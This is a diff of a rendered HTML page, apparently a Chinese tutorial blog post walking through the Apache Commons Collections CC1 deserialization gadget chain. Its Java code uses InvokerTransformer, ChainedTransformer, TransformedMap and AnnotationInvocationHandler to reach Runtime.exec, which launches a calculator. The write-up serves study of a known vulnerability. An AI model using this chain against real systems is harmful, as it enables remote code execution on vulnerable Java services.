-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="o">=</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
@@ -784,13 +784,13 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">entry</span><span class="p">.</span><span class="na">setValue</span><span class="p">(</span><span class="n">r</span><span class="p">);</span><span class="w">                       </span><span class="c1">//调用setValue方法，并把对象r当作对象传入，就是把 Map 里所有的 value 都改成 r</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="/p/cc1_1/image-20250718223810360.png"
 	width="1849"
 	height="850"
-	srcset="/p/cc1_1/image-20250718223810360_hu_e264f0f6537c1479.png 480w, /p/cc1_1/image-20250718223810360_hu_19951ad063e48ddf.png 1024w"
+	srcset="/p/cc1_1/image-20250718223810360_hu_1981bbdf95974b41.png 480w, /p/cc1_1/image-20250718223810360_hu_e7b4b103fa4b26fb.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250718223810360"
@@ -806,7 +806,7 @@
 <p><img src="/p/cc1_1/image-20250718225201193.png"
 	width="1720"
 	height="750"
-	srcset="/p/cc1_1/image-20250718225201193_hu_808f5dd9950f2e89.png 480w, /p/cc1_1/image-20250718225201193_hu_159d33a3d552c474.png 1024w"
+	srcset="/p/cc1_1/image-20250718225201193_hu_391226d2be930066.png 480w, /p/cc1_1/image-20250718225201193_hu_a6b2689c9e33d5aa.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250718225201193"
@@ -880,14 +880,14 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>我们发现<strong>AnnotationInvocationHandler</strong>类是可序列化的。那这里明显就是最终出口了。</p>
 <p><img src="/p/cc1_1/image-20250718225708010.png"
 	width="1035"
 	height="354"
-	srcset="/p/cc1_1/image-20250718225708010_hu_52a93f99109424ac.png 480w, /p/cc1_1/image-20250718225708010_hu_9856b380e7237209.png 1024w"
+	srcset="/p/cc1_1/image-20250718225708010_hu_7962e74c3395598c.png 480w, /p/cc1_1/image-20250718225708010_hu_c6883830670a52c.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250718225708010"
@@ -939,10 +939,10 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">       </span><span class="c1">//反射获取类</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructorhandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">handler</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">     </span><span class="c1">//获取构造器，因为构造器也不是共有的，所以要用getDeclaredConstructor</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">constructorhandler</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">         </span><span class="c1">//修改作用域，确保它可以访问</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructorhandler</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">transformedmap</span><span class="p">);</span><span class="w">     </span><span class="c1">//实例化它，第一个参数是注解，第二个参数是map</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">serialize</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Constructor</span><span class="w"> </span><span class="n">constructorhandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">handler</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">     </span><span class="c1">//获取构造器，因为构造器也不是共有的，所以要用getDeclaredConstructor</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">constructorhandler</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">         </span><span class="c1">//修改作用域，确保它可以访问</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructorhandler</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">transformedmap</span><span class="p">);</span><span class="w">     </span><span class="c1">//实例化它，第一个参数是注解，第二个参数是map</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">serialize</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>到这里链子基本上就完成，完整代码是</p>
@@ -997,17 +997,17 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="o">=</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
@@ -1063,10 +1063,10 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="w"> </span><span class="n">rc</span><span class="o">=</span><span class="n">Class</span><span class="p">.</span><span class="o">*</span><span class="n">forName</span><span class="o">*</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">);</span><span class="w">                 </span><span class="c1">//获取类原型</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Method</span><span class="w"> </span><span class="n">getRuntime</span><span class="o">=</span><span class="w"> </span><span class="n">rc</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">    </span><span class="c1">//获取getRuntime方法，</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="o">=</span><span class="p">(</span><span class="n">Runtime</span><span class="p">)</span><span class="w"> </span><span class="n">getRuntime</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">              </span><span class="c1">//获取实例化对象，因为该方法无无参方法，等价于Runtime r = Runtime.getRuntime();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Method</span><span class="w"> </span><span class="n">exec</span><span class="o">=</span><span class="n">rc</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">        </span><span class="c1">//获取exec方法</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">exec</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">                                         </span><span class="c1">//实现命令执行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Method</span><span class="w"> </span><span class="n">getRuntime</span><span class="o">=</span><span class="w"> </span><span class="n">rc</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">    </span><span class="c1">//获取getRuntime方法，</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="o">=</span><span class="p">(</span><span class="n">Runtime</span><span class="p">)</span><span class="w"> </span><span class="n">getRuntime</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">              </span><span class="c1">//获取实例化对象，因为该方法无无参方法，等价于Runtime r = Runtime.getRuntime();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Method</span><span class="w"> </span><span class="n">exec</span><span class="o">=</span><span class="n">rc</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">        </span><span class="c1">//获取exec方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">                                         </span><span class="c1">//实现命令执行</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>那么上述这样就可以实现序列化，那么现在我们利用transform方法实现上述代码:</p>
@@ -1093,21 +1093,21 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="w"> </span><span class="n">rc</span><span class="o">=</span><span class="n">Class</span><span class="p">.</span><span class="o">*</span><span class="n">forName</span><span class="o">*</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/*Method getRuntime= rc.getDeclaredMethod(&#34;getRuntime&#34;,null);
+</span></span></span><span class="line"><span class="cl"><span class="cm">/*Method getRuntime= rc.getDeclaredMethod(&#34;getRuntime&#34;,null);
 </span></span></span><span class="line"><span class="cl"><span class="cm">Runtime r=(Runtime) getRuntime.invoke(null,null);
 </span></span></span><span class="line"><span class="cl"><span class="cm">Method exec=rc.getDeclaredMethod(&#34;exec&#34;, String.class);
 </span></span></span><span class="line"><span class="cl"><span class="cm">exec.invoke(r,&#34;calc&#34;);*/</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//利用transform方法实现上述代码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//利用transform方法实现上述代码</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getRuntime</span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="p">)</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getDeclaredMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}).</span><span class="na">transform</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//这里模拟获取getRuntime方法，它的具体操作步骤类似之前</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//这里模拟获取getRuntime方法，它的具体操作步骤类似之前</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="o">=</span><span class="p">(</span><span class="n">Runtime</span><span class="p">)</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}).</span><span class="na">transform</span><span class="p">(</span><span class="n">getRuntime</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//这里模拟获取invoke方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//这里模拟获取invoke方法</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}).</span><span class="na">transform</span><span class="p">(</span><span class="n">r</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//这里模拟获取exec方法，并进行命令执行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//这里模拟获取exec方法，并进行命令执行</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这样要一个个嵌套创建参数太麻烦了，我们这里找到了一个Commons Collections库中存在的<code>ChainedTransformer</code>类，它也存在transform方法可以帮我们遍历<code>InvokerTransformer</code>，并且调用transform方法:</p>
@@ -1129,13 +1129,13 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">};</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">          </span><span class="c1">//作为最开始的输入传入，其他的都是互相嵌套而已。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">chainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">          </span><span class="c1">//作为最开始的输入传入，其他的都是互相嵌套而已。</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="/p/cc1_1/image-20250721221432077.png"
 	width="1835"
 	height="712"
-	srcset="/p/cc1_1/image-20250721221432077_hu_a8fa8eedfb0fd438.png 480w, /p/cc1_1/image-20250721221432077_hu_2f55a95845c228ab.png 1024w"
+	srcset="/p/cc1_1/image-20250721221432077_hu_d03acc44b826f657.png 480w, /p/cc1_1/image-20250721221432077_hu_33e813004e069211.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250721221432077"
@@ -1151,7 +1151,7 @@
 </h3><p><img src="/p/cc1_1/image-20250811215144973.png"
 	width="1532"
 	height="972"
-	srcset="/p/cc1_1/image-20250811215144973_hu_da76d9772c6328b.png 480w, /p/cc1_1/image-20250811215144973_hu_6fd55af46b957f25.png 1024w"
+	srcset="/p/cc1_1/image-20250811215144973_hu_a15c4886e7b63eba.png 480w, /p/cc1_1/image-20250811215144973_hu_904bbb9dbeb4f8c.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250811215144973"
@@ -1208,11 +1208,11 @@
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">ConstantTransformer</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">constantToReturn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">              </span><span class="c1">//接受一个对象</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">super</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">iConstant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constantToReturn</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">iConstant</span><span class="p">;</span><span class="w">                   </span><span class="c1">//返回接受的对象</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
@@ -1242,7 +1242,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;mate-calc&#34;</span><span class="p">})</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">};</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
@@ -1301,23 +1301,23 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
